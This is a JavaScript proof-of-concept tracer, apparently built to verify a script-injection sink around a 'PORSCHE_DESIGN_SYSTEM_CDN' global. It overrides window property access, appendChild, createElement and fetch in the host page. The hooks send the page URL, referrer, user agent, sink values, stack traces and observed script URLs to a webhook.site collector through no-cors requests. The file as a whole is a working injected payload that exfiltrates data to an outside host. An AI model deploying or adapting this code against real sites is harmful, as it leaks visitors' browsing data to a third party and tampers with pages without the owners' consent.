// poc-tracer.js — traza lecturas/escrituras del sink y script injections
(() => {
  const WH = "https://webhook.site/c3444402-12db-4d8a-a694-0bc71f2c1521";
  const SINK_KEY = "PORSCHE_DESIGN_SYSTEM_CDN";

  const report = (type, extra={}) => {
    const payload = {
      type,
      ts: new Date().toISOString(),
      url: location.href,
      referrer: document.referrer || null,
      ...extra
    };
    try {
      // no-cors para evitar bloqueos en navegador
      fetch(WH, { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify(payload), mode: "no-cors" });
    } catch (_) {}
    console.log("[TRACER]", type, extra);
  };

  // 0) Beacon de carga
  report("tracer_loaded", { ua: navigator.userAgent });

  // 1) Hook a window[SINK_KEY] (getter/setter) para ver writes/reads del sink
  (function hookSinkProperty(){
    let _val; // backing store
    try {
      Object.defineProperty(window, SINK_KEY, {
        configurable: true,
        enumerable: true,
        get(){
          let stack = "";
          try { throw new Error("get_stack"); } catch(e){ stack = e.stack; }
          report("sink_get", { value: _val, stack });
          return _val;
        },
        set(v){
          let stack = "";
          try { throw new Error("set_stack"); } catch(e){ stack = e.stack; }
          _val = v;
          report("sink_set", { value: String(v), stack });
        }
      });
      report("sink_hook_installed", { key: SINK_KEY });
    } catch (e) {
      report("sink_hook_failed", { error: String(e) });
    }
  })();

  // 2) Hook appendChild para detectar inyección de <script src=...>
  (function hookAppendChild(){
    const ap = Element.prototype.appendChild;
    Element.prototype.appendChild = function(node){
      try {
        if (node && node.tagName === "SCRIPT") {
          report("script_append", { src: node.src || null, inline: !node.src, async: node.async, defer: node.defer });
        }
      } catch(_) {}
      return ap.apply(this, arguments);
    };
    report("appendChild_hook_installed");
  })();

  // 3) Hook createElement por si crean <script> y luego lo insertan
  (function hookCreateElement(){
    const ce = Document.prototype.createElement;
    Document.prototype.createElement = function(tag){
      const el = ce.call(this, tag);
      if ((tag+"").toLowerCase() === "script") {
        // Observa cuando le asignen .src
        Object.defineProperty(el, "src", {
          set(v){
            report("script_src_set", { src: String(v) });
            el.setAttribute("src", v);
          },
          get(){
            return el.getAttribute("src");
          },
          configurable: true
        });
      }
      return el;
    };
    report("createElement_hook_installed");
  })();

  // 4) Hook fetch para ver si consumen URLs “cdn” o de PDS
  (function hookFetch(){
    const _fetch = window.fetch;
    window.fetch = function(input, init){
      const url = (typeof input === "string" ? input : (input?.url || ""));
      try {
        if (url) {
          const interesting = /porsche|cdn|design|pds|\.js(\?|$)/i.test(url);
          if (interesting) report("fetch_call", { url, initiator: "hook" });
        }
      } catch(_){}
      return _fetch.apply(this, arguments);
    };
    report("fetch_hook_installed");
  })();

  // 5) (opcional) auto-ping de ejecución real para que veas que el tracer corrió
  report("execution_confirmed");
})();
